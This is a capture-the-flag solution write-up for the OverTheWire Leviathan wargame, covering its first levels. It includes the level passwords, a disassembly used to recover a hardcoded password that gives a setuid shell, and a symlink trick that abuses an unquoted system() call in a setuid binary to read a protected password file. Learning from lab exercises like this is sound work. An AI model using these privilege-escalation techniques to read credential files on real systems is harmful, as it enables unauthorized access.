# Solution for [Leviathan Wargames](http://overthewire.org/wargames/leviathan/)



### [Level 0](http://overthewire.org/wargames/leviathan/leviathan1.html)
```sh
$ sshpass -p 'leviathan0' ssh leviathan0@leviathan.labs.overthewire.org -p 2223
$ grep -ne 'password' .backup/bookmarks.html
1049:<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```
``` FLAG: rioGegei8m```



### [Level 1](http://overthewire.org/wargames/leviathan/leviathan2.html)
```sh
$ sshpass -p 'rioGegei8m' ssh leviathan1@leviathan.labs.overthewire.org -p 2223
```

Binary `check` has been analyzed under `radare2` and it showed us following dissasmenbly.
```
  int main (int argc, char **argv, char **envp);
; var int32_t var_20h @ ebp-0x20
; var int32_t var_1ch @ ebp-0x1c
; var int32_t var_1bh @ ebp-0x1b
; var int32_t var_17h @ ebp-0x17
; var int32_t var_13h @ ebp-0x13
; var int32_t var_11h @ ebp-0x11
; var char *s2 @ ebp-0x10
; var char *s1 @ ebp-0xc
; var int32_t var_bh @ ebp-0xb
; var int32_t var_ah @ ebp-0xa
; var int32_t var_9h @ ebp-0x9
; var int32_t var_8h @ ebp-0x8
; arg int32_t arg_4h @ esp+0x4
0x0804853b      lea     ecx, [arg_4h]
0x0804853f      and     esp, 0xfffffff0
0x08048542      push    dword [ecx - 4]
0x08048545      push    ebp
0x08048546      mov     ebp, esp
0x08048548      push    ebx
0x08048549      push    ecx
0x0804854a      sub     esp, 0x20
0x0804854d      mov     dword [s2], 0x786573 ; 'sex'
0x08048554      mov     dword [var_17h], 0x72636573 ; 'secr'
0x0804855b      mov     word [var_13h], 0x7465 ; 'et'
0x08048561      mov     byte [var_11h], 0
0x08048565      mov     dword [var_1bh], 0x646f67 ; 'god'
0x0804856c      mov     dword [var_20h], 0x65766f6c ; 'love'
0x08048573      mov     byte [var_1ch], 0
0x08048577      sub     esp, 0xc
0x0804857a      push    str.password: ; 0x8048690 ; "password: " ; const char *format
0x0804857f      call    sym.imp.printf ; int printf(const char *format)
0x08048584      add     esp, 0x10
0x08048587      call    sym.imp.getchar ; int getchar(void)
0x0804858c      mov     byte [s1], al
0x0804858f      call    sym.imp.getchar ; int getchar(void)
0x08048594      mov     byte [var_bh], al
0x08048597      call    sym.imp.getchar ; int getchar(void)
0x0804859c      mov     byte [var_ah], al
0x0804859f      mov     byte [var_9h], 0
0x080485a3      sub     esp, 8
0x080485a6      lea     eax, [s2]
0x080485a9      push    eax        ; const char *s2
0x080485aa      lea     eax, [s1]
0x080485ad      push    eax        ; const char *s1
0x080485ae      call    sym.imp.strcmp ; int strcmp(const char *s1, const char *s2)
```

The most interesting lines:
* ``` 0x0804854d      mov     dword [s2], 0x786573 ; 'sex'``` - Sets `s2` pointer  to string `sex` ine the readonly memory. 


* ``` 0x08048587      call    sym.imp.getchar ; int getchar(void)
    0x0804858c      mov     byte [s1], al
    0x0804858f      call    sym.imp.getchar ; int getchar(void)
    0x08048594      mov     byte [var_bh], al
    0x08048597      call    sym.imp.getchar ; int getchar(void)
    0x0804859c      mov     byte [var_ah], al
    0x0804859f      mov     byte [var_9h], 0 ```
It reads 3 bytes from `getchar` function under address starting at `ebp-0xc`

* ``` 0x080485ae      call    sym.imp.strcmp ; int strcmp(const char *s1, const char *s2) ```
Compares `s1` and `s2`. Whe have to type `sex` string to the input to get a `/bin/sh`.

```
leviathan1@leviathan:~$ ./check 
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2       
ougahZi8Ta
```
``` FLAG: ougahZi8Ta```



### [Level 3](http://overthewire.org/wargames/leviathan/leviathan3.html)
```sh
$ sshpass -p 'ougahZi8Ta' ssh leviathan2@leviathan.labs.overthewire.org -p 2223

leviathan2@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26 22:26 .
drwxr-xr-x 10 root       root       4096 Aug 26 22:26 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26 22:26 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

Take a look on the `ltrace` output.
```
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd674, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                                                                          = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                = 39
geteuid()                                                                                                            = 12002
geteuid()                                                                                                            = 12002
setreuid(12002, 12002)                                                                                               = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
+++ exited (status 0) +++
```

To get a leviathan3 flag I did the following steps. 
```
$ mkdir -p    /tmp/leviathan_lu
$ touch       /tmp/leviathan_lu/file\ level3
$ ls -la      /tmp/leviathan_lu/
$ ln -s       /etc/leviathan_pass/leviathan3 /tmp/leviathan_lu/file
$ ls -la      /tmp/leviathan_lu/
$ ltrace      ./printfile "/tmp/leviathan_lu/file level3"

leviathan2@leviathan:~$ ./printfile "/tmp/leviathan_lu/file level3"
Ahdiemoo1j
/bin/cat: level3: No such file or directory
```
``` FLAG: Ahdiemoo1j```